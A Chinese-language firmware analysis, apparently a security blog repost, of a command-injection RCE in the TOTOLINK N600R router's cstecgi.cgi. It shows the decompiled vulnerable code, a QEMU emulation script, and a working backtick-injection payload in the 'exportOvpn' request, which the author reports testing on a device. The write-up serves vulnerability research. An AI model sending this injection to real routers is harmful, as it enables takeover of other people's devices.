# TOTOLINK N600R RCE漏洞固件分析
> ch0ing
> 来源：https://www.iotsec-zone.com/article/106

# TOTOLINK N600R RCE漏洞固件分析
首先，感谢认真负责的IOTSec-Zone审核大大指出了文中的一处错误。在他的帮助下才完善了文章，分享给大家。
## 固件下载地址
[http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&id=2&ids=36](http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&id=2&ids=36)

## 分析过程
binwalk解压开。
看下目录结构，找到关键的cgi ./web_cste/cgi-bin/cstecgi.cgi
根据file命令看一下架构
![0.png](https://www.iotsec-zone.com/images/MdImg/8c0ada4352bef69be5495ea1df3f8703.png)
使用qemu的user模式跑一下
```
chroot . ./qemu ./web_cste/cgi-bin/cstecgi.cgi
```
![1.png](https://www.iotsec-zone.com/images/MdImg/08046d1be9d629bf2f407fc2bacb9224.png)
ida简单分析一下，可以看到获取了很多环境变量
![2.png](https://www.iotsec-zone.com/images/MdImg/28422a909da7522b4ae2641b08a1064b.png)
补充环境变量再执行，还是不行仔细看了看发现
apmib_init 这个函数的问题。应该是个什么初始化，我们user模式的功能不全导致此函数返回值为flase，所以直接走到报错逻辑。
使用动调时候修改寄存器方式强行过掉此逻辑

![3.png](https://www.iotsec-zone.com/images/MdImg/41b12aa4b10ffc38d203461c51cf3105.png)
目的是使代码走到如下逻辑，控制system的参数。
![4.png](https://www.iotsec-zone.com/images/MdImg/7b2ec1aa1e3f75000eb637a7507bb840.png)

```
if ( strstr(req_str, "exportOvpn") )
      {
        memset(v58, 0, sizeof(v58));
        memset(req_2, 0, sizeof(req_2));
        memset(req_1, 0, sizeof(req_1));
        memset(req_2_value, 0, sizeof(req_2_value));
        memset(v55, 0, 0x80u);
        memset(v49, 0, sizeof(v49));
        memset(v50, 0, sizeof(v50));
        memset(req_3, 0, sizeof(req_3));
        getNthValueSafe(1, req_str, '&', req_1, 128);
        getNthValueSafe(3, req_str, '&', req_3, 64);
        if ( strcmp(req_1, "type=user") )
        {
          if ( !strcmp(req_1, "type=server_cert") )
          {
            strcpy(req_2_value, (const char *)v50);
            system("openvpn-cert backups_server_cert");
            snprintf(v55, 0x80u, "/etc/openvpn/server/user/%s.tar.gz", (const char *)v50);
          }
        }
        else
        {
          getNthValueSafe(2, req_str, '&', req_2, 128);
          getNthValueSafe(1, req_2, '=', req_2_value, 128);
          if ( !req_3[0] || strcmp(req_3, "filetype=gz") )
          {
            snprintf(v58, 0x100u, "openvpn-cert build_user %s config", req_2_value);
            system(v58);
            snprintf(v55, 0x80u, "/etc/openvpn/server/user/%s.ovpn", req_2_value);
          }
          else
          {
            snprintf(v58, 0x100u, "openvpn-cert build_user %s gz", req_2_value);
            system(v58);
            snprintf(v55, 0x80u, "/etc/openvpn/server/user/%s.tar.gz", req_2_value);
          }
        }
  ```

简单分析上下文逻辑，
1.req_str是环境变量QUERY_STRING是请求的url部分(没有确定去没有去掉path)
2.req_str中要有"exportOvpn"
3.第二个参数要为"type=user"
4.第三个参数的value被拿来拼接进system



```
#!/bin/bash

PORT=1234
LEN=-1

cp $(which qemu-mips-static) ./qemu

chroot . ./qemu -strace -E QUERY_STRING="action=exportOvpn&type=user&abcd=\`ls>1.txt\`" -E CONTENT_LENGTH=$LEN -E stationIp="127.0.0.1" -E http_host="127.0.0.1" -g $PORT -E REMOTE_ADDR="127.0.0.1" ./web_cste/cgi-bin/cstecgi.cgi
```

执行如上脚本，即可看到成功执行了我们注入进去的命令。**这里就是注意"`"一定要转义。**
![5.png](https://www.iotsec-zone.com/images/MdImg/4d512bcadd0aff78bd39450179b30b8f.png)


payload:
```
/cgi-bin/cstecgi.cgi?action=exportOvpn&type=user&abcd=`ls>../1.txt`
```
好巧不巧搞到了一个
![6.png](https://www.iotsec-zone.com/images/MdImg/9610f0a6671f5e8bc3835657b6911050.png)

试一下我们分析出来的payload
![7.png](https://www.iotsec-zone.com/images/MdImg/05c1b091652f098c0b9e385631ad4a22.png)
![8.png](https://www.iotsec-zone.com/images/MdImg/521a585cbcc00ec4e5f22a0bfae30a66.png)

成功！

## 小结

总体来讲这个漏洞还是很简单的。但是本菜鸡在调试过程中还是遇到了一些坑
1.一开始没找到apmib_init 的问题，在那里懵了很久。后边才找到强改寄存器的方法。
2.一开始的脚本里边的命令注入符"`"没转义，被审核大大指正。
3.单单的qumu静态模式有时候不太能够确认问题，还是要结合真机或者模拟环境。
